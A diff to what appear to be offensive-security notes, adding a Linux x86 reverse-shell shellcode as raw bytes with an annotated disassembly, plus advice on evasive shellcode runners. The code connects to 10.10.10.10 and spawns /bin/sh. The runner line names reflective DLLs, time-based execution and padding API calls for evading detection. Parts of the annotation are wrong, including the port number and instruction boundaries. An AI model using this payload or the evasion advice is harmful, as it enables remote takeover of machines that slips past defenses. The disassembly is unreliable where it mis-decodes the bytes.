@@ -245,6 +245,54 @@ push ebx
 call ebp
 
 
+##Linux seems easier to approach
+
+\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x0a\x0a\x0a\x68\x02\x00\x00\x50\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80
+
+#translated
+section .text
+global _start
+
+_start:
+    xor ebx, ebx       ; 31 db          - Clear the EBX register to 0
+    mul ebx            ; f7 e3          - Multiply EAX by EBX; clears both EAX and EDX to 0
+    push ebx           ; 53             - Push 0 onto the stack; acts as the IPPROTO_IP argument
+    inc ebx            ; 43             - Increment EBX to 1; sets the sub-call type to SYS_SOCKET
+    push ebx           ; 53             - Push 1 onto the stack; acts as the SOCK_STREAM argument
+    push 2             ; 6a 02          - Push 2 onto the stack; acts as the AF_INET argument
+    mov ecx, esp       ; 89 e1          - Move the stack pointer into ECX to point to the arguments
+    mov al, 0x66       ; b0 66          - Move decimal 102 into AL; system call number for sys_socketcall
+    int 0x80           ; cd 80          - Trigger Linux interrupt to execute the socket() creation
+    xchg eax, ebx      ; 93             - Swap EAX and EBX; stores the new socket file descriptor in EBX
+    pop ecx            ; 59             - Pop the top value from the stack into ECX; initializes loop counter to 2
+
+dup_loop:
+    mov al, 0x3f       ; b0 3f          - Move decimal 63 into AL; system call number for sys_dup2
+    int 0x80           ; cd 80          - Trigger Linux interrupt to redirect a standard I/O descriptor
+    dec ecx            ; 49             - Decrement the loop counter in ECX
+    jns dup_loop       ; 79 f9          - Jump back if the Sign Flag is not set (loops for stderr, stdout, stdin)
+
+    push 0x0a0a0a0a    ; 68 0a 0a 0a 0a - Push the IP address 10.10.10.10 onto the stack
+    push 0x89500002    ; 68 02 00 50 89 - Push the port number 512 and address family parameters
+                       ; e1             - (Byte sequence adjustment)
+    mov al, 0x66       ; b0 66          - Move decimal 102 into AL; system call number for sys_socketcall
+    push eax           ; 50             - Push EAX onto the stack; acts as the address length argument
+    push ecx           ; 51             - Push ECX onto the stack; acts as the pointer to the server address structure
+    push ebx           ; 53             - Push EBX onto the stack; acts as the socket file descriptor argument
+    mov bl, 3          ; b3 03          - Move 3 into BL; sets the sub-call type to SYS_CONNECT
+    mov ecx, esp       ; 89 e1          - Move the stack pointer into ECX to point to the connect arguments
+    int 0x80           ; cd 80          - Trigger Linux interrupt to execute the connect() action
+    push edx           ; 52             - Push 0 onto the stack; acts as a string terminator
+    push 0x68732f6e    ; 68 6e 2f 73 68 - Push the ASCII string "n/sh" onto the stack
+    push 0x69622f2f    ; 68 2f 2f 62 69 - Push the ASCII string "//bi" onto the stack
+    mov ebx, esp       ; 89 e3          - Move the stack pointer into EBX; points EBX to "/bin//sh"
+    push edx           ; 52             - Push 0 onto the stack; acts as a NULL pointer for envp
+    push ebx           ; 53             - Push the pointer to "/bin//sh" onto the stack; acts as argv
+    mov ecx, esp       ; 89 e1          - Move the stack pointer into ECX to point to the argument array
+    mov al, 0x0b       ; b0 0b          - Move decimal 11 into AL; system call number for sys_execve
+    int 0x80           ; cd 80          - Trigger Linux interrupt to execute the shell
+
+
 
 The correct Shellcode Runner is everything!! In your runner add refelective dlls, time based execution, excessive or unnecessary api calls etc.
 
